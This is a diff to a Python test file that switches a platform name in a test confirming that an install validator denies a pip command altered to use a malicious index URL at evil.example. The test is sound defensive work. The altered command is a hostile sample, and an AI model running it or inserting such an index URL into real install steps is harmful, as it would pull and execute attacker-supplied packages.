@@ -168,9 +168,9 @@ def test_canonical_block_with_appended_line_is_denied() -> None:
 
 
 def test_canonical_block_with_altered_line_is_denied() -> None:
-    command = _canonical("gemini_cli").replace("pip install", "pip install --index-url https://evil.example/simple", 1)
+    command = _canonical("antigravity_cli").replace("pip install", "pip install --index-url https://evil.example/simple", 1)
 
-    decision = evaluate_install_command(command, platform="gemini_cli")
+    decision = evaluate_install_command(command, platform="antigravity_cli")
 
     assert not decision.allowed
     assert decision.reasons == ["unresolvable_install_source"]
